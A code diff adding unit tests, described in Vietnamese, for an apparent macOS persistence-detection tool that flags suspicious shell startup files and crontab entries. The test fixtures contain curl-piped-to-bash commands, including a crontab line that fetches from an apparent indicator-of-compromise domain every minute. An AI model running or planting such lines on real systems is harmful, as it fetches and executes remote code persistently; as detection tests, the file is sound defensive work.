@@ -8,6 +8,7 @@ import {
   ancestorPids,
   classifyPersistence,
   classifyProcess,
+  classifyStartupText,
   diffSnapshot,
   expandHome,
   isAllowlisted,
@@ -17,6 +18,7 @@ import {
   parsePlistText,
   parsePs,
   parseTccLog,
+  readCrontab,
 } from "../lib/detect.mjs";
 
 const cfg = {
@@ -217,4 +219,57 @@ test("parseTccLog chịu được dòng rác và attribution mồ côi", () => {
   assert.deepEqual(parseTccLog(""), []);
   assert.deepEqual(parseTccLog("dong rac\nkhong lien quan"), []);
   assert.deepEqual(parseTccLog('AUTHREQ_ATTRIBUTION: msgID=999.9, attribution={}'), []);
+});
+
+// --- Watcher bề mặt khởi động (rc file / crontab / login items) ---
+
+test("classifyStartupText: dòng curl|bash trong .zshrc là tín hiệu CỨNG", () => {
+  const rc = '# comment\nexport PATH=/usr/bin:$PATH\ncurl -fsSL https://x.tld/i | bash\n';
+  const r = classifyStartupText("~/.zshrc", rc, cfg, iocs);
+  assert.equal(r.severity, "hard");
+  assert.ok(r.reasons.some((x) => x.includes("pipe-to-shell")));
+});
+
+test("classifyStartupText: dòng crontab khớp IOC là tín hiệu CỨNG", () => {
+  const cron = "* * * * * /bin/bash -c 'curl --noproxy \"*\" https://v3ctorium.link | bash'\n";
+  const r = classifyStartupText("crontab", cron, cfg, iocs);
+  assert.equal(r.severity, "hard");
+  assert.ok(r.reasons.some((x) => x.startsWith("IOC")));
+});
+
+test("classifyStartupText: trỏ vào /tmp là tín hiệu MỀM, dòng lành thì sạch", () => {
+  const soft = classifyStartupText("~/.zshrc", 'export X="/tmp/payload/run.sh"\n', cfg, iocs);
+  assert.equal(soft.severity, "medium");
+  assert.ok(soft.reasons.some((x) => x.includes("vùng đáng ngờ")));
+
+  const clean = classifyStartupText("~/.zshrc", 'eval "$(/opt/homebrew/bin/brew shellenv)"\nalias ll="ls -la"\n', cfg, iocs);
+  assert.equal(clean.severity, null);
+  assert.deepEqual(clean.reasons, []);
+});
+
+test("classifyStartupText bỏ qua dòng comment và không khớp nhầm đường dẫn hệ thống", () => {
+  const r = classifyStartupText("~/.zprofile", '# curl https://x | bash\nexport P=/opt/homebrew/bin\n', cfg, iocs);
+  assert.equal(r.severity, null);
+});
+
+test("readCrontab coi 'no crontab' là hợp lệ và trả chuỗi rỗng", () => {
+  const noCron = () => {
+    const e = new Error("rc=1");
+    e.stderr = "crontab: no crontab for minhnguyen\n";
+    throw e;
+  };
+  assert.deepEqual(readCrontab({ run: noCron }), { ok: true, text: "" });
+
+  const err = () => {
+    const e = new Error("rc=1");
+    e.stderr = "operation not permitted\n";
+    throw e;
+  };
+  const r = readCrontab({ run: err });
+  assert.equal(r.ok, false);
+  assert.ok(r.error.includes("not permitted"));
+
+  const ok = readCrontab({ run: () => "*/5 * * * * /bin/x\n" });
+  assert.equal(ok.ok, true);
+  assert.ok(ok.text.includes("*/5"));
 });
